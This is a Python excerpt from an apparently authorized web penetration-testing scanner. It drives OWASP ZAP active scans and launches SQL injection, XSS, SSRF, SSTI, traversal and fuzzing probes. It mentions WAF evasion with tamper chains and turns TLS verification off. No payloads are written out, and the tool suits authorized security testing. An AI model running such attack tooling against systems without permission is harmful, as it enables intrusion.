    async def zap_active_scan(self, base_url: str, seed_urls: list = None) -> list:
        import httpx

        zap_url = os.getenv("ZAP_URL", "http://zap:8090").rstrip("/")
        api_key = os.getenv("ZAP_API_KEY", "")
        if not zap_url:
            return []

        def _p(params):
            p = dict(params)
            if api_key:
                p["apikey"] = api_key
            return p

        async def _get(c, path, params):
            r = await c.get(f"{zap_url}{path}", params=_p(params))
            r.raise_for_status()
            return r.json()

        findings = []
        try:
            async with httpx.AsyncClient(timeout=30, verify=False) as c:
                # ZAP may still be booting when the first mission runs.
                ready = False
                for _ in range(6):
                    try:
                        await _get(c, "/JSON/core/view/version/", {})
                        ready = True
                        break
                    except Exception:
                        await asyncio.sleep(5)
                if not ready:
                    await self.log("OWASP ZAP not reachable; skipping ZAP active scan", "warn")
                    self._mark_tool_missing("zap")
                    return []

                ver = (await _get(c, "/JSON/core/view/version/", {})).get("version", "?")
                await self.log(f"OWASP ZAP {ver} online; seeding target", "info")

                # Authenticated scan: inject the session cookie on every ZAP request.
                if self._cookie():
                    try:
                        await _get(c, "/JSON/replacer/action/addRule/", {
                            "description": "yggdrasil-auth-cookie", "enabled": "true",
                            "matchType": "REQ_HEADER", "matchString": "Cookie",
                            "matchRegex": "false", "replacement": self._cookie(),
                        })
                        await self.log("ZAP: authenticated session cookie applied to all requests", "info")
                    except Exception:
                        await self.log("ZAP: could not apply auth cookie (replacer add-on missing?)", "warn")

                await _get(c, "/JSON/core/action/accessUrl/", {"url": base_url, "followRedirects": "true"})

                # Import the endpoints our own crawl already found (same host) into
                # ZAP's site tree. accessUrl fetches each so its params land in the
                # tree and the active scanner tests every discovered URL, including
                # JS/SPA routes the ZAP spider alone would miss.
                base_host = urlparse(base_url).netloc
                if seed_urls:
                    same_host = [u for u in dict.fromkeys(seed_urls)
                                 if u.startswith("http") and urlparse(u).netloc == base_host
                                 and u.rstrip("/") != base_url.rstrip("/")]
                    # Parameterized endpoints first — those are what the active
                    # scanner actually exercises for injection.
                    same_host.sort(key=lambda u: 0 if ("?" in u and "=" in u) else 1)
                    seeds = same_host[:MAX_ZAP_SEED]
                    seeded = 0
                    for u in seeds:
                        try:
                            await _get(c, "/JSON/core/action/accessUrl/",
                                       {"url": u, "followRedirects": "true"})
                            seeded += 1
                        except Exception:
                            continue
                    if seeded:
                        await self.log(f"Seeded {seeded} discovered endpoints into ZAP tree", "info")

                # Spider to build the site tree.
                spider_id = (await _get(c, "/JSON/spider/action/scan/", {"url": base_url, "recurse": "true"})).get("scan")
                await self.log("ZAP spider crawling", "info")
                for _ in range(40):
                    await asyncio.sleep(5)
                    st = (await _get(c, "/JSON/spider/view/status/", {"scanId": spider_id})).get("status", "0")
                    if int(st) >= 100:
                        break

                # Let the passive scanner drain the spidered records.
                for _ in range(12):
                    recs = (await _get(c, "/JSON/pscan/view/recordsToScan/", {})).get("recordsToScan", "0")
                    if int(recs) == 0:
                        break
                    await asyncio.sleep(5)

                # Active scan: the real DAST work.
                ascan_id = (await _get(c, "/JSON/ascan/action/scan/",
                                       {"url": base_url, "recurse": "true", "inScopeOnly": "false"})).get("scan")
                if ascan_id is None:
                    await self.log("ZAP active scan could not start", "warn")
                else:
                    await self.log("ZAP active scan running (slow phase)", "info")
                    last = -1
                    for _ in range(150):
                        await asyncio.sleep(5)
                        sti = int((await _get(c, "/JSON/ascan/view/status/", {"scanId": ascan_id})).get("status", "0"))
                        if sti >= last + 25 and sti < 100:
                            await self.log(f"ZAP active scan {sti}%", "info")
                            last = sti
                        if sti >= 100:
                            break

                raw = await _get(c, "/JSON/core/view/alerts/",
                                 {"baseurl": base_url, "start": "0", "count": "1000"})
                alerts = raw.get("alerts", [])

            RISK = {"High": ("high", 8.0), "Medium": ("medium", 5.5), "Low": ("low", 3.5)}
            # Consolidate by alert type. ZAP fires the same rule on every URL, so
            # one missing header becomes 100+ rows. Group them into one finding
            # and keep every affected URL listed as a PoC target underneath.
            groups = {}
            for a in alerts:
                risk = a.get("risk", "")
                if risk not in RISK:
                    continue
                name = a.get("alert") or a.get("name", "ZAP alert")
                g = groups.setdefault((name, risk), {
                    "urls": [], "params": set(),
                    "cwe": a.get("cweid", ""),
                    "description": a.get("description", ""),
                    "solution": a.get("solution", ""),
                    "evidence": a.get("evidence", ""),
                    "attack": a.get("attack", ""),
                })
                u = a.get("url", "")
                if u and u not in g["urls"]:
                    g["urls"].append(u)
                if a.get("param"):
                    g["params"].add(a["param"])

            order = {"High": 0, "Medium": 1, "Low": 2}
            for (name, risk), g in sorted(groups.items(),
                                          key=lambda kv: (order[kv[0][1]], -len(kv[1]["urls"]))):
                sev, cvss = RISK[risk]
                urls = g["urls"]
                count = len(urls)
                shown = urls[:40]
                findings.append({"name": name, "risk": risk, "instances": count, "urls": urls})
                ev = [f"Affected instances: {count}"]
                if g["params"]:
                    ev.append("Parameters: " + ", ".join(sorted(g["params"])[:25]))
                if g["attack"]:
                    ev.append("Attack: " + g["attack"])
                if g["evidence"]:
                    ev.append("Sample evidence: " + g["evidence"])
                if g["cwe"]:
                    ev.append("CWE-" + str(g["cwe"]))
                ev.append("Affected URLs" + (f" (first 40 of {count})" if count > 40 else "") + ":")
                ev.extend("  " + u for u in shown)
                await self.add_finding(
                    title=f"[ZAP] {name}" + (f" ({count} instances)" if count > 1 else ""),
                    severity=sev,
                    description=(g["description"] or f"OWASP ZAP flagged {name}.")[:1500],
                    evidence="\n".join(ev)[:4000],
                    cvss_score=cvss,
                    remediation=(g["solution"] or "Review the ZAP alert and apply the recommended fix.")[:900],
                )

            await self.log(f"OWASP ZAP scan complete: {len(findings)} alerts (High/Med/Low)",
                           "success" if findings else "info")
        except Exception as e:
            await self.log(f"ZAP active scan error: {e}", "warn")

        return findings

    async def map_redirects(self, base_url: str, urls: list, cap: int = 40) -> list:
        """Record same-host redirect edges (3xx Location) across discovered URLs so
        the topology can draw how endpoints hop to each other. Returns a list of
        {from, to, status} (path -> path). Fast: no-follow GETs, capped."""
        import httpx
        base_host = urlparse(base_url).netloc
        targets = list(dict.fromkeys([base_url] + list(urls)))[:cap]
        seen, edges = set(), []
        try:
            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
                                         headers=self._auth_headers()) as c:
                for u in targets:
                    try:
                        r = await c.get(u)
                    except Exception:
                        continue
                    if r.status_code not in (301, 302, 303, 307, 308):
                        continue
                    loc = r.headers.get("location", "")
                    if not loc:
                        continue
                    dest = urlparse(urljoin(u, loc))
                    if dest.netloc and dest.netloc != base_host:
                        continue  # off-host redirect: not a tree node, keep it out
                    frm = urlparse(u).path or "/"
                    to = dest.path or "/"
                    if frm == to:
                        continue
                    key = (frm, to)
                    if key in seen:
                        continue
                    seen.add(key)
                    edges.append({"from": frm, "to": to, "status": r.status_code})
        except Exception as e:
            await self.log(f"Redirect mapping skipped: {e}", "warn")
        if edges:
            await self.log(f"Redirect map: {len(edges)} redirect edge(s)", "info")
        return edges

    def _mark_tool_missing(self, key: str):
        """Record that a binary-backed module could not run because its tool was
        absent — so the report says 'tool unavailable', never a false 'tested 0'."""
        if not hasattr(self, "_tools_missing"):
            self._tools_missing = set()
        self._tools_missing.add(key)

    def _build_module_status(self, result: dict, waf_detected: bool) -> dict:
        """Per-module honesty for the SAGA report: separate 'tested' from
        'tool_unavailable' (binary missing) and 'blocked' (WAF ate the traffic),
        so a 0 that means 'inconclusive' is never rendered as 'clean'."""
        binary_backed = {"sqli", "xss", "dast", "content", "zap", "forms", "dom", "oob"}
        missing = getattr(self, "_tools_missing", set())
        status = {}
        for key in ("sqli", "xss", "dast", "auth", "traversal", "zap", "content",
                    "ssrf", "ssti", "open_redirect", "cors", "host_header", "fuzz", "forms",
                    "dom", "oob"):
            if key in missing:
                status[key] = "tool_unavailable"
            elif len(result.get(key) or []):
                status[key] = "tested"
            elif waf_detected and key in binary_backed:
                status[key] = "blocked"
            else:
                status[key] = "tested"
        return status

    async def run_offensive(
        self,
        base_url: str,
        extra_wordlists: list = None,
        credentials: dict = None,
        declared_paths: list = None,
        scope_rules: dict = None,
    ) -> dict:
        await self.log(f"⚔ Offensive engine engaged against {base_url}", "info")
        # Evasion/WAF-awareness counters for this run (read by the probes below).
        self._tools_missing = set()
        self._waf_blocks = 0
        self._probe_requests = 0
        # Authenticate first (when creds are supplied) so the crawl and every
        # scanner reuse the session. Any failure degrades to unauthenticated.
        self._auth_cookie = await self.authenticate(base_url, credentials) if credentials else None
        if credentials and not self._auth_cookie:
            await self.log(
                f"⚠ Authenticated scanning requested but login failed on {base_url}; "
                f"testing the UNAUTHENTICATED surface only", "warn")
        # Attack surface = active crawl (katana) + passive archive discovery
        # (Wayback) + active param mining (arjun style), collapsed by param set.
        crawled = await self.crawl(base_url)
        archived = await self.gather_archive_urls(base_url)
        mined = await self.mine_params(base_url)
        seeded = await self.seed_endpoints(base_url)     # API/SPA endpoints crawlers miss
        spec_urls = await self.import_api_specs(base_url)  # OpenAPI/Swagger, if exposed
        urls = self._dedupe_by_params(
            list(dict.fromkeys(crawled + archived + mined + seeded + spec_urls)))
        synthetic_urls = self.generate_parameter_test_urls(
            base_url,
            urls,
            declared_paths=declared_paths,
            scope_rules=scope_rules,
        )
        if synthetic_urls:
            urls = self._dedupe_by_params(list(dict.fromkeys(urls + synthetic_urls)))
            await self.log(
                f"Declared scope paths seeded {len(synthetic_urls)} parameterized probe URL(s)",
                "info",
            )
        params = len([u for u in urls if "?" in u and "=" in u])
        await self.log(
            f"Attack surface: {len(urls)} unique endpoints ({params} parameterized) "
            f"from crawl + archives + param mining + API/SPA seeding + specs", "info")

        # Form/POST attack surface (logins, searches, checkout) — the inputs a
        # URL crawler never exposes, and where auth-bypass SQLi / stored XSS live.
        forms = await self.discover_forms([base_url] + urls)
        redirects = await self.map_redirects(base_url, urls)  # endpoint->endpoint hops

        # Run injection / access-control classes concurrently where safe.
        (sqli, xss, dast, auth, trav, disco,
         ssrf, ssti, oredir, cors, hosthdr, fuzz, formhits, domx, oob) = await asyncio.gather(
            self.test_sqli(base_url, urls),
            self.test_xss(urls),
            self.nuclei_dast(urls),
            self.test_auth(base_url, urls),
            self.test_path_traversal(urls),
            self.content_discovery(base_url, extra_wordlists),
            self.test_ssrf(urls),
            self.test_ssti(urls),
            self.test_open_redirect(urls),
            self.test_cors(base_url, urls),
            self.test_host_header(base_url),
            self.deep_fuzz(urls, base_url=base_url),
            self.test_forms(forms),
            self.dom_xss_scan(urls),
            self.oast_scan(urls),
            return_exceptions=True,
        )

        def _safe(x):
            return x if isinstance(x, list) else []

        # OWASP ZAP full active scan: heavy, runs after the fast probes. Seed it
        # with every endpoint our crawl found so ZAP scans each URL, not just root.
        zap = await self.zap_active_scan(base_url, seed_urls=urls)

        result = {
            "crawled_urls": len(urls),
            "endpoints": urls[:2000],   # real attack surface for the inventory
            "redirects": redirects,     # same-host redirect edges for the topology
            "sqli": _safe(sqli),
            "xss": _safe(xss),
            "dast": _safe(dast),
            "auth": _safe(auth),
            "traversal": _safe(trav),
            "zap": _safe(zap),
            "content": _safe(disco),
            "ssrf": _safe(ssrf),
            "ssti": _safe(ssti),
            "open_redirect": _safe(oredir),
            "cors": _safe(cors),
            "host_header": _safe(hosthdr),
            "fuzz": _safe(fuzz),
            "forms": _safe(formhits),
            "dom": _safe(domx),
            "oob": _safe(oob),
        }
        # WAF/CDN awareness: if a large share of active probes were bounced, the
        # binary tools' "0 findings" is INCONCLUSIVE (blocked), not "clean".
        waf_detected = (
            self._probe_requests >= 12
            and self._waf_blocks >= 8
            and self._waf_blocks / max(1, self._probe_requests) >= 0.5
        )
        result["waf_detected"] = waf_detected
        result["module_status"] = self._build_module_status(result, waf_detected)

        if waf_detected:
            await self.log(
                f"WAF/CDN blocking detected ({self._waf_blocks}/{self._probe_requests} probes bounced); "
                "active results are INCONCLUSIVE, not clean", "warn")
            await self.add_finding(
                title="Target Appears WAF/CDN-Protected (active results inconclusive)",
                severity="info",
                description=(
                    "A large share of active probes were rejected by a WAF/CDN "
                    f"({self._waf_blocks} of {self._probe_requests}). Automated injection tools were "
                    "likely blocked before reaching the application, so a '0 findings' result for "
                    "those modules does NOT mean the target is clean — it means the checks were "
                    "inconclusive. Yggdrasil already presents a browser User-Agent, a sqlmap tamper "
                    "chain, and dalfox WAF-evasion; getting real coverage past this needs custom "
                    "tamper scripts, request throttling, or a source IP the target owner allowlists."),
                evidence=f"Blocked probes: {self._waf_blocks}/{self._probe_requests}",
                cvss_score=0.0,
                remediation=(
                    "For coverage, coordinate a WAF allowlist / test window with the target owner. "
                    "For defense, confirm the WAF is in blocking (not monitor-only) mode and validate "
                    "it against real evasion payloads, not just naive scanners."),
            )

        total = sum(len(_safe(v)) for v in
                    (sqli, xss, dast, auth, trav, zap, ssrf, ssti, oredir, cors, hosthdr,
                     fuzz, formhits, domx, oob))
        await self.log(f"⚔ Offensive engine complete: {total} injection/access/DAST findings across {len(urls)} URLs", "success")
        return result
